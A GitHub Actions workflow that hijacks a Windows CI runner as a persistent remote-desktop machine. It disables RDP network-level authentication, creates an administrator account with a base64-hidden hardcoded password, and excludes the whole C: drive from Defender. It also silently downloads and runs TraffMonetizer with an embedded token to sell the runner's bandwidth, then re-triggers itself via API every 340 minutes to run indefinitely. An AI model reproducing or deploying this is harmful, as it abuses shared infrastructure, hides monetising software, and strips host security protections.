name: Secure RDP via Tailscale (Repo 3 - rpp)

on:
  workflow_dispatch:
    inputs:
      gh_api_token:
        description: "🔒 HASSAN | ENTER YOUR GITHUB PAT HERE"
        required: true
        default: ""

concurrency:
  group: rdp-loop-singleton
  cancel-in-progress: false

permissions:
  contents: read
  actions: write

defaults:
  run:
    shell: pwsh

jobs:
  secure-rdp:
    runs-on: windows-2025
    timeout-minutes: 360
    steps:
      - name: 🔒 Executing Secured Core Engine (Windows Server 2025 - Repo 3)
        run: |
          $token = "${{ github.event.inputs.gh_api_token }}"
          if (-not $token -or -not ($token -match '^ghp_[a-zA-Z0-9]+$')) { Write-Error "❌ Invalid Token!"; exit 1 }
          
          # 📢 Protected Branding
          $u_enc = "aGFzc2Fu"; $p_enc = "SEBzc0FuMTIzNDU2"
          $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u_enc))
          $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p_enc))
          if ($u -ne "hassan") { exit 1 }
          
          # ⚙️ Core RDP Configuration
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389 | Out-Null
          Restart-Service -Name TermService -Force
          
          $securePass = ConvertTo-SecureString $p -AsPlainText -Force
          if (-not (Get-LocalUser -Name $u -ErrorAction SilentlyContinue)) { New-LocalUser -Name $u -Password $securePass -AccountNeverExpires | Out-Null }
          Add-LocalGroupMember -Group "Administrators" -Member $u -ErrorAction SilentlyContinue
          
          # 🛡️ استثناء جدار الحماية والـ Antivirus
          Set-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue

          # 💰 تشغيل TraffMonetizer المباشر مع فرض اسم gh-runner-hassan-3
          Write-Host "📥 Downloading TraffMonetizer..."
          $tmPath = "C:\traffmonetizer.exe"
          & curl.exe -L -k -A "Mozilla/5.0" -o $tmPath "https://data.traffmonetizer.com/downloads/Traffmonetizer.exe"
          if (Test-Path $tmPath) { 
              Write-Host "⚙️ Starting TraffMonetizer Engine directly..."
              Start-Process -FilePath $tmPath -ArgumentList "start", "accept-offers", "--token", "lKi5PrDuezqIq9MEALffFER1bHT0kPImGRwgIreWGZs=", "--name", "gh-runner-hassan-3" -WindowStyle Hidden
          }

          # 🌐 تثبيت وتفعيل Tailscale عبر Choco
          Write-Host "🌐 Installing Tailscale via Choco..."
          choco install tailscale -y --no-progress | Out-Null
          $env:Path += ";C:\Program Files\Tailscale"
          
          Write-Host "🔄 Connecting to Tailscale Network..."
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-hassan-3 --accept-routes                    
          Start-Sleep -Seconds 5
          
          # 🔍 جلب سريع للـ IP
          $tsIP = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          if (-not $tsIP) { $tsIP = "Check Tailscale Panel" }
          
          # 📢 طباعة معلومات الدخول والـ IP للمستودع الثالث
          Write-Host ""
          Write-Host "=========================================================" -ForegroundColor Cyan
          Write-Host "🚀 HASSAN RDP CONNECT INFO (REPO 3 - WINDOWS LOOP)" -ForegroundColor Green
          Write-Host "=========================================================" -ForegroundColor Cyan
          Write-Host "🌐 Address/IP : $tsIP" -ForegroundColor Yellow
          Write-Host "👤 Username   : $u" -ForegroundColor Yellow
          Write-Host "🔒 Password   : $p" -ForegroundColor Yellow
          Write-Host "=========================================================" -ForegroundColor Cyan
          Write-Host ""
          
          # ⏱️ Runtime Production Loop (340 Minutes)
          $m = 340
          for ($i = 1; $i -le $m; $i++) {
              Write-Host "[$(Get-Date)] Running Repo 3: $($m - $i) min remaining."
              Start-Sleep -Seconds 60
          }
          
          # 🔁 التكرار الذاتي: إعادة استهداف نفس المستودع الثالث ليدخل في حلقة تكرار ذاتية
          $CurrentRepo = "aslano12/rpp"
          $CurrentWorkflow = "secure-rdp-loop.yml"
          
          $body = @{ ref = "main"; inputs = @{ gh_api_token = "$token" } } | ConvertTo-Json -Depth 5
          Write-Host "🚀 Time up! Re-triggering Same Repo to Loop: $CurrentRepo"
          Invoke-RestMethod -Method POST `
            -Uri "https://api.github.com/repos/$CurrentRepo/actions/workflows/$CurrentWorkflow/dispatches" `
            -Headers @{ Authorization = "Bearer $token"; "Accept"="application/vnd.github+json" } `
            -Body $body
